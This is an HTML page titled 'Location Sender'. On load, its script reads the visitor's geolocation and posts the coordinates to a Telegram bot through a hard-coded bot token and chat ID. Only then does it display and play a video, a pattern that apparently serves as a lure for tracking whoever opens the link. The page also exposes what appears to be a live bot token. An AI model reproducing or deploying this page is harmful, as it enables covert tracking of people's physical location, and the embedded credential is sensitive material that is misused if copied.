<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Location Sender</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    #myVideo {
      width: 100%;
      max-width: 600px;
      display: none;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>üìç Sending your location...</h2>
  <p id="status">Please wait...</p>

  <video id="myVideo" controls>
    <source src="myvideo.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>

  <script>
    window.onload = function () {
      const status = document.getElementById('status');
      const video = document.getElementById('myVideo');

      if (!navigator.geolocation) {
        status.innerText = "‚ùå Your browser does not support geolocation.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const token = '7841305499:AAElwSSCBPF6-2cf_NEL3TXiK760exGM9pg';
          const chatId = '7570861617';
          const message = `üìç User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;

          status.innerText = "üì° Sending location to Telegram...";

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: message
            })
          })
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              status.innerText = "‚úÖ Location sent successfully!";
              video.style.display = "block";
              video.play();
            } else {
              status.innerText = `‚ùå Telegram Error: ${JSON.stringify(data)}`;
            }
          })
          .catch(error => {
            status.innerText = `‚ùå Fetch Error: ${error}`;
          });
        },
        error => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              status.innerText = "‚ùå Location permission denied.";
              break;
            case error.POSITION_UNAVAILABLE:
              status.innerText = "‚ùå Location unavailable.";
              break;
            case error.TIMEOUT:
              status.innerText = "‚ùå Location request timed out.";
              break;
            default:
              status.innerText = "‚ùå Unknown geolocation error.";
          }
        }
      );
    };
  </script>
</body>
</html>
